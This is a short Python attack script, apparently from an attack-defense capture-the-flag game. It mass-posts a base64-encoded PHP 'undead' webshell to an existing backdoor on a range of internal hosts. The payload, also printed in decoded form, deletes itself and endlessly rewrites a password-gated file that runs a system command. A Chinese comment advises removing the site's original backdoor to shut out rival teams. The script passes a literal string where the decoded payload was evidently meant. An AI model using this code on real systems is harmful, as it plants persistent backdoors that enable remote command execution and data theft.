import requests
import base64
for i in range(150,161):
	url = "http://10.201.64." + str(i) + "/shell/eval.php"
	shell = 'aWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7c2V0X3RpbWVfbGltaXQoMCk7dW5saW5rKF9fRklMRV9fKTskZmlsZSA9ICItLTBhIi5tZDUocmFuZCgxLDMpKS4iW2FdLnBocCI7JGNvZGUgPSAnPD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iNzZhMjE3M2JlNjM5MzI1NGU3MmZmYTRkNmRmMTAzMGEiKXtzeXN0ZW0oImNhdCAvZmxhZyIpO30gPz4nO3doaWxlICgxKXtmaWxlX3B1dF9jb250ZW50cygkZmlsZSwkY29kZSk7dXNsZWVwKDEwKTt9'

	data = {

		'a':'base64.b64decode(shell)'
	}
	r = requests.post(url, data)

'''
通过网站开始加固阶段找到的小马上传自己的不死马，之后通过catflag.py的方式读取flag，不用再通过eval.php的小马读取flag，也记得在加固阶段上传完不死马后，将网站自带的小马删除，避免其他红队使用。

ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = "--0a".md5(rand(1,3))."[a].php";$code = '<?php if(md5($_GET["pass"])=="76a2173be6393254e72ffa4d6df1030a"){system("cat /flag");} ?>';while (1){file_put_contents($file,$code);usleep(10);}

aWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7c2V0X3RpbWVfbGltaXQoMCk7dW5saW5rKF9fRklMRV9fKTskZmlsZSA9ICItLTBhIi5tZDUocmFuZCgxLDMpKS4iW2FdLnBocCI7JGNvZGUgPSAnPD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iNzZhMjE3M2JlNjM5MzI1NGU3MmZmYTRkNmRmMTAzMGEiKXtzeXN0ZW0oImNhdCAvZmxhZyIpO30gPz4nO3doaWxlICgxKXtmaWxlX3B1dF9jb250ZW50cygkZmlsZSwkY29kZSk7dXNsZWVwKDEwKTt9
'''